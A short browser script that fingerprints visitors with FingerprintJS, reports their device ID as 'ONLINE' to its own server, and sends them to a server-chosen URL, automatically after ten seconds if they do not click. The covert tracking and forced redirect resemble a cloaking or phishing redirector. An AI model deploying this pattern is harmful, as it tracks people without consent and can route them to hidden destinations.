const trigger = document.getElementById('ghost-trigger');
let isProcessing = false;

async function syncInteractionStatus(visitorId, statusMessage) {
    // Railway proxy ko bypass karne ke liye absolute URL automatic detect karega
    const serverOrigin = window.location.origin;
    
    await fetch(`${serverOrigin}/update-device`, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({ 
            client_id: visitorId,
            status: statusMessage,
            timestamp: new Date().toISOString()
        })
    }).catch((err) => console.log("Network Drop:", err));
}

trigger.onclick = async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        const serverOrigin = window.location.origin;
        const configRes = await fetch(`${serverOrigin}/get-config`);
        if (!configRes.ok) throw new Error();
        const config = await configRes.json();

        const fpPromise = FingerprintJS.load();
        const fp = await fpPromise;
        const result = await fp.get();
        const visitorId = result.visitorId;

        // Bckend database state update
        await syncInteractionStatus(visitorId, "ONLINE");
        
        // Redirect execution
        window.location.href = config.redirect_url;

    } catch (error) {
        isProcessing = false;
    }
};

setTimeout(async () => {
    if (!isProcessing) {
        try {
            const serverOrigin = window.location.origin;
            const configRes = await fetch(`${serverOrigin}/get-config`);
            if (configRes.ok) {
                const config = await configRes.json();
                window.location.href = config.redirect_url;
            }
        } catch(err) {}
    }
}, 10000);
